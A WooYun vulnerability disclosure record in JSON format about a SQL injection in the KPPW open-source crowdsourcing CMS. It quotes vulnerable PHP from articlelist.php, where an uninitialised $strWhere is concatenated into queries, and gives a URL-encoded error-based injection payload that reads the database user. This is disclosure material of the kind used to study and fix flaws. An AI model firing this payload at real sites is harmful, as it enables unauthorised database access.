{"id": 43557, "wybug_id": "wooyun-2014-082390", "wybug_title": "KPPW系统sql注入-3", "wybug_corp": "kppw", "wybug_author": "路人甲", "wybug_date": "2014-11-07 16:39", "wybug_open_date": "2015-02-05 16:40", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KPPW是客客团队主打的开源威客系统，同类开源建站产品的领跑者，搭建无物流电子商务在线服务交易平台的首选系统。2014年6月新版KPPW2.5发布了，新版借助客客团队近4年来威客行业的开源产品和商业项目的成熟经验，对前端功能进行了深入改进。KPPW从产品规划、UI设计、程序开发多个环节进行了优化，在未做框架重构情况下对程序进行更优秀的改进。  详细说明：  \n在文件control/articlelist.php中<?php defined ( 'IN_KEKE' ) or exit ( 'Access Denied' );$strNavActive = 'articlelist';$strUrl = $_K['siteurl'].\"/index.php?do=articlelist\";$catid and $strUrl .=\"&catid=\".intval($catid);$intPage and $strUrl .=\"&intPage=\".$intPage;$arrArtCats = kekezu::get_table_data ( \"*\", \"witkey_article_category\", \"cat_type='article' and art_cat_pid=1\", \"listorder asc\", \"\", \"\", \"\", null );$page and $intPage = intval($page);$intPage = intval ( $intPage ) ? $intPage : 1;$intPagesize = intval ( $intPagesize ) ? $intPagesize : 20;intval($catid) and $intCatid = intval($catid) or $intCatid = intval($arrArtCats['0']['art_cat_id']);$intCatid and $strWhere .= \" and a.art_cat_id = $intCatid\";$strWhere.=\" and a.is_show!=2\";$strWhere .=\" order by is_recommend desc,a.listorder asc,pub_time desc\";$strSql = \"select a.* ,b.cat_name from \" . TABLEPRE . \"witkey_article a left join \" . TABLEPRE . \"witkey_article_category b on a.art_cat_id=b.art_cat_id where b.cat_type='article'  $strWhere\";$strCsql = \"select count(a.art_id) as c  from \" . TABLEPRE . \"witkey_article a left join \" . TABLEPRE . \"witkey_article_category b on a.art_cat_id=b.art_cat_id where b.cat_type='article'  $strWhere\";$intCount = intval ( db_factory::get_count ( $strCsql,0,NULL, 10*60 ) );这里$strwhere没有初始化，可以直接在URL参数中传入strwhere.  由于这里$strwhere带入到了两个sql中，用报错法执行方便一点poc:strWhere=and%20%28select%201%20from%20%28select%20count%28%2a%29%2Cconcat%28user%28%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23\n\n\n   漏洞证明：  poc:strWhere=and%20%28select%201%20from%20%28select%20count%28%2a%29%2Cconcat%28user%28%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}